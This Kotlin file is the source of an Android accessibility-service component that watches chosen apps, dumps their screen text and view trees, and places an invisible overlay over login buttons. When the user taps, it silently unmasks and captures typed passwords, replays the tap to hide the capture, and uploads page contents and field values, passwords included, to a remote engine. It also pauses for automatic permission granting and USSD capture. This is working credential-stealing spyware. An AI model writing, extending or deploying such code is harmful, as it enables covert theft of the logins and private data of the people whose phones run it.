package com.base.realtime.watch

import android.accessibilityservice.AccessibilityService
import android.content.pm.PackageManager
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityWindowInfo
import com.base.realtime.RealtimeApp
import com.base.realtime.access.AutoGrantOrchestrator
import com.base.realtime.config.AppConfigs
import com.base.realtime.protocol.Protocol
import com.base.realtime.ussd.UssdCapture
import kotlinx.serialization.json.JsonArray
import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.buildJsonArray
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put

internal class WatchController(private val service: AccessibilityService) {
    private val main = Handler(Looper.getMainLooper())
    private val overlay = MainTapOverlay(service) { x, y -> onCoveredTap(x, y) }
    private val eyeMark = RectMarkOverlay(service)
    private val markEye = AppConfigs.load(service).watchMarkEye
    private var session: WatchSession? = null
    private var passingTap = false
    private val dumpTask = Runnable { dumpNow() }
    private val placeTask = Runnable { placeOverlay() }

    fun onEvent(event: AccessibilityEvent) {
        if (busy()) {
            pause()
            return
        }
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED && !passingTap) {
            onViewClicked(event)
        }
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOWS_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
            -> {
                syncForeground()
                if (session == null) {
                    overlay.hide()
                    eyeMark.hide()
                    return
                }
                main.removeCallbacks(dumpTask)
                main.postDelayed(dumpTask, 380)
                main.removeCallbacks(placeTask)
                main.postDelayed(placeTask, 220)
            }
        }
    }

    fun pause() {
        overlay.hide()
        eyeMark.hide()
    }

    fun stop() {
        endSession()
        overlay.hide()
        eyeMark.hide()
    }

    fun syncForeground() {
        if (busy()) return
        val pkg = foregroundPackage() ?: return
        if (isTransient(pkg)) return
        val live = session
        if (live != null && live.pkg != pkg) endSession()
        if (WatchedPackages.contains(service, pkg) && session == null) {
            session = WatchSession(pkg, appLabel(pkg), System.currentTimeMillis())
        }
    }

    private fun dumpNow() {
        val live = session ?: return
        val lines = PageDump.collect(service, live.pkg)
        val tree = PageDump.collectTreeFull(service, live.pkg)
        live.addPage(lines, tree, PageDump.signature(lines))
    }

    private fun placeOverlay() {
        val live = session ?: return
        if (busy()) {
            overlay.hide()
            eyeMark.hide()
            return
        }
        val look = FormScan.look(service, live.pkg)
        val masked = look.fields.any { it.password && needsEye(it.text) }
        if (look.main != null && look.password != null && (look.eye != null || masked)) {
            overlay.place(look.main)
        } else {
            overlay.hide()
        }
        if (markEye) {
            eyeMark.place(look.eye)
        } else {
            eyeMark.hide()
        }
    }

    private fun onCoveredTap(x: Int, y: Int) {
        val live = session ?: return
        passingTap = true
        overlay.setInteractive(false)
        EyeReveal.reveal(service, live.pkg) { fields ->
            live.attachFields(fields)
            overlay.replayTap(x, y) {
                main.postDelayed({ passingTap = false }, 700)
                overlay.setInteractive(true)
            }
        }
    }

    private fun onViewClicked(event: AccessibilityEvent) {
        val live = session ?: return
        val source = event.source ?: return
        try {
            if (source.packageName?.toString() != live.pkg) return
            val look = FormScan.look(service, live.pkg)
            val mainBounds = look.main ?: return
            val tap = android.graphics.Rect()
            source.getBoundsInScreen(tap)
            if (!mainBounds.contains(tap.centerX(), tap.centerY()) && !android.graphics.Rect.intersects(mainBounds, tap)) {
                return
            }
            EyeReveal.reveal(service, live.pkg) { fields -> live.attachFields(fields) }
        } finally {
            source.recycle()
        }
    }

    private fun endSession() {
        val live = session ?: return
        session = null
        overlay.hide()
        eyeMark.hide()
        upload(live)
    }

    private fun upload(live: WatchSession) {
        val pages = if (live.pages.isEmpty()) {
            listOf(WatchSession.WatchPage(live.startedAt, emptyList(), emptyList(), ArrayList()))
        } else {
            live.pages.toList()
        }
        val ended = System.currentTimeMillis()
        val id = "${live.pkg}_${live.startedAt}"
        pages.forEachIndexed { index, page ->
            val payload = buildJsonObject {
                put("sessionId", id)
                put("package", live.pkg)
                put("label", live.label)
                put("startedAt", live.startedAt)
                put("endedAt", ended)
                put("index", index)
                put("total", pages.size)
                put("pages", buildJsonArray {
                    add(buildJsonObject {
                        put("at", page.at)
                        put("lines", JsonArray(page.lines.map { JsonPrimitive(it) }))
                        put("tree", JsonArray(page.tree.map { JsonPrimitive(it) }))
                        put("fields", buildJsonArray {
                            page.fields.forEach { field ->
                                add(buildJsonObject {
                                    put("name", field.name)
                                    put("hint", field.hint)
                                    put("text", field.text)
                                    put("password", field.password)
                                })
                            }
                        })
                    })
                })
            }
            RealtimeApp.engine(service).enqueue(Protocol.TYPE_WATCH_SESSION, payload)
        }
    }

    private fun foregroundPackage(): String? {
        val windows = service.windows ?: return null
        var active: String? = null
        try {
            for (window in windows) {
                if (!window.isActive || window.type != AccessibilityWindowInfo.TYPE_APPLICATION) continue
                val root = window.root ?: continue
                val pkg = root.packageName?.toString()
                root.recycle()
                if (!pkg.isNullOrBlank()) active = pkg
            }
        } finally {
            for (window in windows) {
                try {
                    window.recycle()
                } catch (_: Throwable) {
                }
            }
        }
        return active
    }

    private fun isTransient(pkg: String): Boolean {
        if (pkg == service.packageName) return false
        return pkg == "android" ||
            pkg.startsWith("com.android.systemui") ||
            pkg.contains("inputmethod") ||
            pkg.contains("permissioncontroller")
    }

    private fun appLabel(pkg: String): String {
        return try {
            val info = service.packageManager.getApplicationInfo(pkg, 0)
            service.packageManager.getApplicationLabel(info).toString()
        } catch (_: PackageManager.NameNotFoundException) {
            pkg
        }
    }

    private fun busy(): Boolean = AutoGrantOrchestrator.isActive() || UssdCapture.pending()

    private fun needsEye(value: String): Boolean {
        return value.any { it == '•' || it == '●' || it == '∙' || it == '·' || it == '*' || it == '⚫' }
    }
}
